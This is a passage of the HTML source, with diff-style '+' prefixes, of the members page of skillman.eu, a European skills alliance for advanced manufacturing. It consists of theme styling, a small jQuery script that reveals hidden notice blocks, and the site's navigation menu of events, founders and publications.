+		<style type="text/css" data-type="vc_shortcodes-custom-css">.vc_custom_1678716432411{margin-bottom: -50px !important;}</style><noscript><style> .wpb_animate_when_almost_visible { opacity: 1; }</style></noscript><script>
+jQuery( document ).ready(function() {
+
+jQuery( ".applybtn" ).click(function() {
+ if (!jQuery(".vc_custom_1513796783353").is(':visible'))
+{
+jQuery('.vc_custom_1513796783353').show();
+}
+
+
+});
+
+
+
+
+jQuery( ".registerbtn" ).click(function() {
+ if (!jQuery(".noticeblock").is(':visible'))
+{
+jQuery('.noticeblock').show();
+}
+
+
+});
+});
+</script><style id='the7-custom-inline-css' type='text/css'>
+.noticeblock { display : none; background-color: #fcf8e3;
+    border-color: #faebcc;padding:20px;}
+.noticeblock p{
+color : #8a6d3b;
+}
+
+.sifvideobackground
+{
+	height: 380px;
+}
+</style>
+</head>
+<body id="the7-body" class="page-template-default page page-id-44996 wp-embed-responsive title-off dt-responsive-on right-mobile-menu-close-icon ouside-menu-close-icon mobile-hamburger-close-bg-enable mobile-hamburger-close-bg-hover-enable  fade-medium-mobile-menu-close-icon fade-medium-menu-close-icon accent-gradient srcset-enabled btn-flat custom-btn-color custom-btn-hover-color phantom-fade phantom-shadow-decoration phantom-custom-logo-on floating-mobile-menu-icon top-header first-switch-logo-left first-switch-menu-right second-switch-logo-left second-switch-menu-right right-mobile-menu layzr-loading-on popup-message-style the7-ver-11.8.0.1 dt-fa-compatibility wpb-js-composer js-comp-ver-7.0 vc_responsive">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-dark-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0.49803921568627" /><feFuncG type="table" tableValues="0 0.49803921568627" /><feFuncB type="table" tableValues="0 0.49803921568627" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.54901960784314 0.98823529411765" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.71764705882353 0.25490196078431" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-red"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 0.27843137254902" /><feFuncB type="table" tableValues="0.5921568627451 0.27843137254902" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-midnight"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0" /><feFuncG type="table" tableValues="0 0.64705882352941" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-magenta-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.78039215686275 1" /><feFuncG type="table" tableValues="0 0.94901960784314" /><feFuncB type="table" tableValues="0.35294117647059 0.47058823529412" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-green"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.65098039215686 0.40392156862745" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.44705882352941 0.4" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-orange"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.098039215686275 1" /><feFuncG type="table" tableValues="0 0.66274509803922" /><feFuncB type="table" tableValues="0.84705882352941 0.41960784313725" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><!-- The7 11.8.0.1 -->
+<div id="load" class="spinner-loader">
+	<div class="load-wrap"><style type="text/css">
+    [class*="the7-spinner-animate-"]{
+        animation: spinner-animation 1s cubic-bezier(1,1,1,1) infinite;
+        x:46.5px;
+        y:40px;
+        width:7px;
+        height:20px;
+        fill:var(--the7-beautiful-spinner-color2);
+        opacity: 0.2;
+    }
+    .the7-spinner-animate-2{
+        animation-delay: 0.083s;
+    }
+    .the7-spinner-animate-3{
+        animation-delay: 0.166s;
+    }
+    .the7-spinner-animate-4{
+         animation-delay: 0.25s;
+    }
+    .the7-spinner-animate-5{
+         animation-delay: 0.33s;
+    }
+    .the7-spinner-animate-6{
+         animation-delay: 0.416s;
+    }
+    .the7-spinner-animate-7{
+         animation-delay: 0.5s;
+    }
+    .the7-spinner-animate-8{
+         animation-delay: 0.58s;
+    }
+    .the7-spinner-animate-9{
+         animation-delay: 0.666s;
+    }
+    .the7-spinner-animate-10{
+         animation-delay: 0.75s;
+    }
+    .the7-spinner-animate-11{
+        animation-delay: 0.83s;
+    }
+    .the7-spinner-animate-12{
+        animation-delay: 0.916s;
+    }
+    @keyframes spinner-animation{
+        from {
+            opacity: 1;
+        }
+        to{
+            opacity: 0;
+        }
+    }
+</style>
+<svg width="75px" height="75px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
+	<rect class="the7-spinner-animate-1" rx="5" ry="5" transform="rotate(0 50 50) translate(0 -30)"></rect>
+	<rect class="the7-spinner-animate-2" rx="5" ry="5" transform="rotate(30 50 50) translate(0 -30)"></rect>
+	<rect class="the7-spinner-animate-3" rx="5" ry="5" transform="rotate(60 50 50) translate(0 -30)"></rect>
+	<rect class="the7-spinner-animate-4" rx="5" ry="5" transform="rotate(90 50 50) translate(0 -30)"></rect>
+	<rect class="the7-spinner-animate-5" rx="5" ry="5" transform="rotate(120 50 50) translate(0 -30)"></rect>
+	<rect class="the7-spinner-animate-6" rx="5" ry="5" transform="rotate(150 50 50) translate(0 -30)"></rect>
+	<rect class="the7-spinner-animate-7" rx="5" ry="5" transform="rotate(180 50 50) translate(0 -30)"></rect>
+	<rect class="the7-spinner-animate-8" rx="5" ry="5" transform="rotate(210 50 50) translate(0 -30)"></rect>
+	<rect class="the7-spinner-animate-9" rx="5" ry="5" transform="rotate(240 50 50) translate(0 -30)"></rect>
+	<rect class="the7-spinner-animate-10" rx="5" ry="5" transform="rotate(270 50 50) translate(0 -30)"></rect>
+	<rect class="the7-spinner-animate-11" rx="5" ry="5" transform="rotate(300 50 50) translate(0 -30)"></rect>
+	<rect class="the7-spinner-animate-12" rx="5" ry="5" transform="rotate(330 50 50) translate(0 -30)"></rect>
+</svg></div>
+</div>
+<div id="page" >
+	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
+
+<div class="masthead inline-header center widgets full-height shadow-decoration shadow-mobile-header-decoration small-mobile-menu-icon mobile-menu-icon-bg-on mobile-menu-icon-hover-bg-on dt-parent-menu-clickable show-sub-menu-on-hover show-mobile-logo"  role="banner">
+
+	<div class="top-bar line-content top-bar-empty top-bar-line-hide">
+	<div class="top-bar-bg" ></div>
+	<div class="mini-widgets left-widgets"></div><div class="mini-widgets right-widgets"></div></div>
+
+	<header class="header-bar">
+
+		<div class="branding">
+	<div id="site-title" class="assistive-text">skillman.eu</div>
+	<div id="site-description" class="assistive-text">Sector Skills Alliance for Advanced Manufacturing</div>
+	<a class="" href="https://skillman.eu/"><img class=" preload-me" src="https://skillman.eu/wp-content/uploads/2021/10/logoskillman-small.png" srcset="https://skillman.eu/wp-content/uploads/2021/10/logoskillman-small.png 175w, https://skillman.eu/wp-content/uploads/2021/10/logoskillman-retina.png 350w" width="175" height="53"   sizes="175px" alt="skillman.eu" /><img class="mobile-logo preload-me" src="https://skillman.eu/wp-content/uploads/2021/10/logoskillman-small.png" srcset="https://skillman.eu/wp-content/uploads/2021/10/logoskillman-small.png 175w, https://skillman.eu/wp-content/uploads/2021/10/logoskillman-retina.png 350w" width="175" height="53"   sizes="175px" alt="skillman.eu" /></a></div>
+
+		<ul id="primary-menu" class="main-nav underline-decoration l-to-r-line outside-item-remove-margin"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-63297 first depth-0"><a href='https://web.skillman.eu/sif2023' data-level='1'><span class="menu-item-text"><span class="menu-text">SIF 2023</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-42327 has-children depth-0"><a data-level='1'><span class="menu-item-text"><span class="menu-text">Skillman Method</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-62695 first depth-1"><a href='http://skillman.eu/lifecycle-concept/' data-level='2'><span class="menu-item-text"><span class="menu-text">Lifecycle concept</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-42325 has-children depth-1"><a href='#' data-level='2'><span class="menu-item-text"><span class="menu-text">Skills</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-42324 first depth-2"><a href='https://skillman.eu/skills/' data-level='3'><span class="menu-item-text"><span class="menu-text">Skills Pillars</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-37148 has-children depth-2"><a href='#' data-level='3'><span class="menu-item-text"><span class="menu-text">Standards</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38000 first depth-3"><a href='https://skillman.eu/eqavet_european_quality_assurance_in_vet-2/' data-level='4'><span class="menu-item-text"><span class="menu-text">ECVET</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38010 depth-3"><a href='https://skillman.eu/eqavet_european_quality_assurance_in_vet-2-2/' data-level='4'><span class="menu-item-text"><span class="menu-text">EQF</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36972 depth-3"><a href='https://skillman.eu/eqavet_european_quality_assurance_in_vet/' data-level='4'><span class="menu-item-text"><span class="menu-text">EQAVET</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36973 depth-3"><a href='https://skillman.eu/esco_skills_competencies_occupations/' data-level='4'><span class="menu-item-text"><span class="menu-text">ESCO</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43232 depth-2"><a href='https://skillman.eu/memorandum-of-understanding/' data-level='3'><span class="menu-item-text"><span class="menu-text">MoU among Skillman&#8217;s Members</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-45555 has-children depth-2"><a href='https://skillman.eu/skillman-ethical-skills-awards-video-contest/' data-level='3'><span class="menu-item-text"><span class="menu-text">Skillman Ethical Skills Awards &#8211; Video Contest</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-45756 first depth-3"><a href='https://skillman.eu/submit-your-candidature/' data-level='4'><span class="menu-item-text"><span class="menu-text">Submit your candidature</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43841 depth-3"><a href='https://skillman.eu/awards-2/' data-level='4'><span class="menu-item-text"><span class="menu-text">Skillman Ethical Skills Awards Yearbook</span></span></a></li> </ul></li> </ul></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-62696 depth-1"><a href='https://skillman.coves.eu/' data-level='2'><span class="menu-item-text"><span class="menu-text">coves.eu</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-38074 act has-children depth-0"><a href='#' data-level='1'><span class="menu-item-text"><span class="menu-text">The Network</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36961 first depth-1"><a href='https://skillman.eu/timeline/' data-level='2'><span class="menu-item-text"><span class="menu-text">Network Timeline</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-44996 current_page_item current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-44998 act has-children depth-1"><a href='https://skillman.eu/members/' data-level='2'><span class="menu-item-text"><span class="menu-text">Members</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-44996 current_page_item menu-item-has-children menu-item-44997 act first has-children depth-2"><a href='https://skillman.eu/members/' data-level='3'><span class="menu-item-text"><span class="menu-text">Map of Members</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-62720 first depth-3"><a href='https://skillman.eu/members-list/' data-level='4'><span class="menu-item-text"><span class="menu-text">Search by criteria</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-42606 depth-2"><a href='https://skillman.eu/member-profiles/' data-level='3'><span class="menu-item-text"><span class="menu-text">Roles</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38580 depth-2"><a href='https://skillman.eu/ambassadors/' data-level='3'><span class="menu-item-text"><span class="menu-text">Ambassadors’ Club</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-37719 has-children depth-2"><a href='#' data-level='3'><span class="menu-item-text"><span class="menu-text">Founders</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36976 first depth-3"><a href='https://skillman.eu/bmet/' data-level='4'><span class="menu-item-text"><span class="menu-text">BMET</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36977 depth-3"><a href='https://skillman.eu/cepas/' data-level='4'><span class="menu-item-text"><span class="menu-text">CEPAS</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36978 depth-3"><a href='https://skillman.eu/cnr/' data-level='4'><span class="menu-item-text"><span class="menu-text">CNR</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36979 depth-3"><a href='https://skillman.eu/crf/' data-level='4'><span class="menu-item-text"><span class="menu-text">CRF (an FCA company)</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36980 depth-3"><a href='https://skillman.eu/cscs/' data-level='4'><span class="menu-item-text"><span class="menu-text">CSCS</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36981 depth-3"><a href='https://skillman.eu/eal/' data-level='4'><span class="menu-item-text"><span class="menu-text">EAL</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37117 depth-3"><a href='https://skillman.eu/eef/' data-level='4'><span class="menu-item-text"><span class="menu-text">EEF</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36982 depth-3"><a href='https://skillman.eu/iu/' data-level='4'><span class="menu-item-text"><span class="menu-text">IU</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36983 depth-3"><a href='https://skillman.eu/jlr/' data-level='4'><span class="menu-item-text"><span class="menu-text">JLR</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36984 depth-3"><a href='https://skillman.eu/sas/' data-level='4'><span class="menu-item-text"><span class="menu-text">SAS</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36985 depth-3"><a href='https://skillman.eu/tec-5/' data-level='4'><span class="menu-item-text"><span class="menu-text">TEC</span></span></a></li> </ul></li> </ul></li> <li class="bp-menu bp-register-nav menu-item menu-item-type-custom menu-item-object-custom menu-item-40674 depth-1"><a href='https://skillman.eu/register' data-level='2'><span class="menu-item-text"><span class="menu-text">Join the Network</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-43197 has-children depth-1"><a data-level='2'><span class="menu-item-text"><span class="menu-text">Collaboration</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43000 first depth-2"><a href='https://skillman.eu/include-skillman-in-a-new-project-partnership/' data-level='3'><span class="menu-item-text"><span class="menu-text">Partnership opportunities</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-42531 depth-2"><a href='https://skillman.eu/submit-your-idea/' data-level='3'><span class="menu-item-text"><span class="menu-text">Submit Your Project Ideas</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43820 depth-2"><a href='https://skillman.eu/skillnet-management-platform/' data-level='3'><span class="menu-item-text"><span class="menu-text">Skillnet Management Platform</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-51804 depth-1"><a href='https://skillman.eu/skillnet-2022/' data-level='2'><span class="menu-item-text"><span class="menu-text">Skillnet 2022</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-38069 has-children depth-0"><a href='#' data-level='1'><span class="menu-item-text"><span class="menu-text">Activities</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-59530 first has-children depth-1"><a data-level='2'><span class="menu-item-text"><span class="menu-text">Alliance Summit</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-59531 first depth-2"><a href='https://skillman.eu/as2023/' data-level='3'><span class="menu-item-text"><span class="menu-text">Kabada Conference &#8211; Alliance Summit 2023</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-63782 depth-2"><a href='https://skillman.eu/as2022' data-level='3'><span class="menu-item-text"><span class="menu-text">TVET Alliance Summit 2022</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-59532 has-children depth-1"><a data-level='2'><span class="menu-item-text"><span class="menu-text">Skillman International Forum</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-55203 first depth-2"><a href='https://skillman.eu/sif2022/' data-level='3'><span class="menu-item-text"><span class="menu-text">2022 International Forum</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-51729 depth-2"><a href='https://skillman.eu/sif2021/' data-level='3'><span class="menu-item-text"><span class="menu-text">2021 International Forum</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-47357 depth-2"><a href='https://skillman.eu/sif2020/' data-level='3'><span class="menu-item-text"><span class="menu-text">2020 International Forum</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43448 depth-2"><a href='https://skillman.eu/skillman-eu-international-forum-2019/' data-level='3'><span class="menu-item-text"><span class="menu-text">2019 International Forum</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-42377 depth-2"><a href='https://skillman.eu/skillman-eu-international-forum-2018/' data-level='3'><span class="menu-item-text"><span class="menu-text">2018 International Forum</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-post_type menu-item-object-post menu-item-51934 depth-1"><a href='https://skillman.eu/tvet-digital-triathlon/' data-level='2'><span class="menu-item-text"><span class="menu-text">TVET Digital Triathlon</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-45448 depth-1"><a href='https://skillman.eu/ethical-campaign-to-redefine-the-future-of-learning/' data-level='2'><span class="menu-item-text"><span class="menu-text">Ethical campaign to redefine the future of learning</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44746 depth-1"><a href='https://skillman.eu/skillman-youth-forum/' data-level='2'><span class="menu-item-text"><span class="menu-text">Skillman Youth Forum</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44978 depth-1"><a href='https://skillman.eu/skillman-at-the-european-skills-week-2020/' data-level='2'><span class="menu-item-text"><span class="menu-text">Skillman at the European Skills Week 2020</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-38066 has-children depth-1"><a href='#' data-level='2'><span class="menu-item-text"><span class="menu-text">Events And Conferences</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43990 first depth-2"><a href='https://skillman.eu/peer-learning-clubs/' data-level='3'><span class="menu-item-text"><span class="menu-text">Peer Learning Clubs</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44259 depth-2"><a href='https://skillman.eu/webinars-on-eu-fund-opportunities/' data-level='3'><span class="menu-item-text"><span class="menu-text">Webinars on EU fund opportunities</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44927 depth-2"><a href='https://skillman.eu/skillman-technical-webinars/' data-level='3'><span class="menu-item-text"><span class="menu-text">Skillman technical webinars</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43949 depth-2"><a href='https://skillman.eu/skillnet-events/' data-level='3'><span class="menu-item-text"><span class="menu-text">Future Events list</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-44279 has-children depth-2"><a data-level='3'><span class="menu-item-text"><span class="menu-text">Past Events</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-36965 first has-children depth-3"><a href='https://skillman.eu/timeline/2017-final-international-conference-2/' data-level='4'><span class="menu-item-text"><span class="menu-text">2017 November – San Sebastian International Conference</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37090 first depth-4"><a href='https://skillman.eu/why/' data-level='5'><span class="menu-item-text"><span class="menu-text">Why</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37089 depth-4"><a href='https://skillman.eu/focus/' data-level='5'><span class="menu-item-text"><span class="menu-text">Focus</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37088 depth-4"><a href='https://skillman.eu/partners/' data-level='5'><span class="menu-item-text"><span class="menu-text">Partners</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37087 depth-4"><a href='https://skillman.eu/contacts/' data-level='5'><span class="menu-item-text"><span class="menu-text">Contacts</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36963 depth-3"><a href='https://skillman.eu/timeline/second-international-conference/' data-level='4'><span class="menu-item-text"><span class="menu-text">2017 March – Birmingham International Conference</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36967 depth-3"><a href='https://skillman.eu/timeline/2016-international-conference/' data-level='4'><span class="menu-item-text"><span class="menu-text">2016 International Conference</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36966 depth-3"><a href='https://skillman.eu/timeline/2015-international-conference/' data-level='4'><span class="menu-item-text"><span class="menu-text">2015 International Conference</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36962 depth-3"><a href='https://skillman.eu/the-conference/' data-level='4'><span class="menu-item-text"><span class="menu-text">2015 The Kick-off Conference</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-43951 depth-2"><a href='https://airtable.com/shramDhZda158jH4J' target='_blank' data-level='3'><span class="menu-item-text"><span class="menu-text">Get your invitations and funds support</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-43205 depth-2"><a href='http://skillman.eu/new-event/' data-level='3'><span class="menu-item-text"><span class="menu-text">Add your events</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-43536 has-children depth-1"><a href='https://skillman.eu/news/' data-level='2'><span class="menu-item-text"><span class="menu-text">News</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43537 first depth-2"><a href='https://skillman.eu/news/' data-level='3'><span class="menu-item-text"><span class="menu-text">Skillman News</span></span></a></li> </ul></li> </ul></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-37100 has-children depth-0"><a href='#' data-level='1'><span class="menu-item-text"><span class="menu-text">Resources</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-46597 first depth-1"><a href='https://skillman.eu/skillman-advisory-service/' data-level='2'><span class="menu-item-text"><span class="menu-text">Skillman advisory service</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-42437 depth-1"><a href='https://skillman.eu/webinars-catalog/' data-level='2'><span class="menu-item-text"><span class="menu-text">Webinars catalog</span></span></a></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-44343 has-children depth-1"><a href='#' data-level='2'><span class="menu-item-text"><span class="menu-text">Publications</span></span></a><ul class="sub-nav gradient-hover hover-style-bg level-arrows-on"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44348 first depth-2"><a href='https://skillman.eu/peer-learning-club-1-advanced-manufacturing-sector-publication/' data-level='3'><span class="menu-item-text"><span class="menu-text">Peer Learning Club 1- Advanced Manufacturing Sector</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44392 depth-2"><a href='https://skillman.eu/peer-learning-club-2-advocacy-policy-influencing/' data-level='3'><span class="menu-item-text"><span class="menu-text">Peer Learning Club 2 – Advocacy &#038; Policy Influencing</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44391 depth-2"><a href='https://skillman.eu/peer-learning-club-3-work-based-learning-and-standards/' data-level='3'><span class="menu-item-text"><span class="menu-text">Peer Learning Club 3 – Work-based learning and standards</span></span></a></li> <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44390 depth-2"><a href='https://skillman.eu/peer-learning-club-4-train-the-trainers/' data-level='3'><span class="menu-item-text"><span class="menu-text">Peer Learning Club 4 – Train the trainers</span></span></a></li> </ul></li> <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-37011 depth-1"><a href='http://learn.skillman.eu' data-level='2'><span class="menu-item-text"><span class="menu-text">Curricula Platform</span></span></a></li> <li class="menu-item menu-item-type-post_type 